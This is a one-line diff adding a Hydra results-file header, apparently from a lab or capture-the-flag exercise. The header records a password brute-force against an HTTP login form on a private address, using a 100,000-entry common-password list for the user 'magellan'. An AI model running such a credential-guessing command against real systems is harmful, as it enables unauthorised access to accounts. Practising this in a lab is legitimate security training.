@@ -1,0 +1,1 @@
+# Hydra v9.1 run at 2022-09-30 22:20:39 on 192.168.231.129 http-post-form (hydra -l magellan -P /home/manbolq/Desktop/manbolq/repos/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt -s 8080 -o resultsPass.txt 192.168.231.129 http-post-form /:username=magellan&password=^PASS^:Invalid password)
